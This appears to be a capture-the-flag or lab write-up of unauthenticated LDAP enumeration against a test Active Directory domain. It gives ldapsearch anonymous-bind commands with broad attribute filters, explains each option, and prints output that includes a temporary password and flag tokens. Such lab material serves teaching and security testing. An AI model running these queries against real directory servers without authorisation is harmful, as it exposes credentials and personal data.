### Our first mission is: Enumerate user objects and extract information from exposed user attributes via Unauthenticated LDAP

Blueprint:
`ldapsearch [1. Authentication Type] [2. Target Connection] [3. Search Anchor] [4. Target Filter]`

Command:

```bash
ldapsearch -x -H ldap://192.168.56.20 -b "DC=PENTESTLAB,DC=local" "(|(adminDescription=*)(adminDisplayName=*)(info=*))"

```

Explanation:

`-x`: Specifies simple authentication. When used without a Bind DN (`-D`) and password (`-w`), it attempts an anonymous bind to interact with the directory using unauthenticated guest permissions.

`-H ldap://192.168.56.20`: Declares the target Uniform Resource Identifier (URI) pointing to the network IP address of the Domain Controller listening on the standard LDAP port 389.

`-b "DC=PENTESTLAB,DC=local"`: Sets the base Distinguished Name (DN). This dictates the top-level directory root location where the tool will begin recursively crawling objects in the Active Directory database.

`"(|(adminDescription=*)(adminDisplayName=*)(info=*))"`: A logical **OR** (`|`) search filter that evaluates every object in the tree. It instructs the server to return only the records where at least one of these non-standard fields (`adminDescription`, `adminDisplayName`, or `info`) is populated with data.

Brief Explanation:

> "Open a basic, unencrypted network connection to the directory server at 192.168.56.20 over port 389. Omit all login identities and credentials to trigger an anonymous entry request, testing if the server allows unauthenticated queries. Once inside, traverse down from the absolute domain root of PENTESTLAB.local and search all objects. Apply a logical query filter to sift through every user profile and isolate the accounts that have custom administrative or information fields filled out, pulling back data exposed by administrative oversight."

Output:

```text
# Diana Reeves, Users, LDAP-Project, PENTESTLAB.local
dn: CN=Diana Reeves,OU=Users,OU=LDAP-Project,DC=PENTESTLAB,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Diana Reeves
description: Temp password: Reeves@Temp2024
distinguishedName: CN=Diana Reeves,OU=Users,OU=LDAP-Project,DC=PENTESTLAB,DC=local
instanceType: 4
whenCreated: 20260423115205.0Z
whenChanged: 20260506145827.0Z
uSNCreated: 290939
info: FLAG0{921d2a56bd128240587aa7abbcad0a37fb8e5c6e091fa763754f27648fbe} - FOUND!
memberOf: CN=LDAP-Lab-Users,OU=Groups,OU=LDAP-Project,DC=PENTESTLAB,DC=local

```

---

### Our Second Mission is: Extract custom flag data globally by targeting administrative descriptors

Blueprint:
`ldapsearch [1. Authentication Type] [2. Target Connection] [3. Search Anchor] [4. Universal Target Filter] | grep [5. Filtering Keyword]`

Command:

```bash
ldapsearch -x -H ldap://192.168.56.20 -b "DC=PENTESTLAB,DC=local" "(|(adminDescription=*)(adminDisplayName=*)(info=*)(comment=*)(description=*)(displayName=*)(extensionAttribute1=*)(extensionAttribute2=*)(extensionAttribute3=*)(extensionAttribute4=*)(extensionAttribute5=*)(extensionAttribute6=*)(extensionAttribute7=*)(extensionAttribute8=*)(extensionAttribute9=*)(extensionAttribute10=*)(extensionAttribute11=*)(extensionAttribute12=*)(extensionAttribute13=*)(extensionAttribute14=*)(extensionAttribute15=*)(employeeNumber=*)(employeeType=*)(otherMailbox=*)(assistant=*)(wWWHomePage=*)(url=*))" | grep -i flag

```

Explanation:

`"(|(adminDescription=*)...(url=*))"`: A massive logical **OR** matrix. It scans every single structural user schema placeholder, extension property attribute, and custom employee field looking for any non-null strings across the entire domain topology.

`| grep -i flag`: Pipes the massive incoming unauthenticated LDAP data dump out of standard output and feeds it into the grep utility. The `-i` option ensures case-insensitive pattern matching, isolating only the lines containing the literal keyword string `flag`.

Brief Explanation:

> "Launch a widespread anonymous query checking every potential descriptive or custom attribute available in the directory schema from the domain root down. Because this produces a massive wall of technical diagnostic output, pipe the entire unauthenticated text stream into a case-insensitive regular expression engine to strip out the noise, printing only the exact parameters where flag tokens or leaked configurations are stored."

Interaction Workflow & Retrieval:

```text
description: FLAG0{518f239e03cdf...cd60863dc920ee15aa73753ec6551
...
```
